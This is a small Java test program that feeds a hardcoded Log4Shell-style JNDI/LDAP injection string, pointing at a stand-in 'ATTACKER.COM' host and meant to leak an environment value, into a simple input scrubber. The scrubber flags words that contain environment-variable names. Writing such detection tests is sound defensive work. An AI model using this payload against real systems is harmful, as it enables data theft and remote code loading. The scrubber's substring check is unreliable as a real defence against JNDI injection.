import java.util.Map;

public class HelloWorld{
     public static void main(String []args){
        String userInput = "${JNDI:LDAP://{$PATH}.ATTACKER.COM:8888/LOREM}"; 
         
        HelloWorld helloworld = new HelloWorld(); 
        boolean result = helloworld.scrubUserInput(userInput);
        
        if(result){
            System.out.println("\nTrue - string is bad\n");
        }else{
            System.out.println("\nFalse - string is good\n");
        };
        
        /*View all environment variables*/
        //Map<String, String> env = System.getenv();
        //env.forEach((key, v) -> System.out.println(key));
     }
     
     public boolean scrubUserInput(String userInput){
         String[] words = userInput.split(" ");
         int detector = 0;
         
         Map<String, String> env = System.getenv();
        
          for (Map.Entry<String, String> entry : env.entrySet()) {
            for (String temp : words) {
                  if (temp.toLowerCase().contains(entry.getKey().toLowerCase())) {
                      detector++;
              }
            }
          }
         
         if(detector > 0){
              return true;
         }else{
              return false;
         }
     }
}
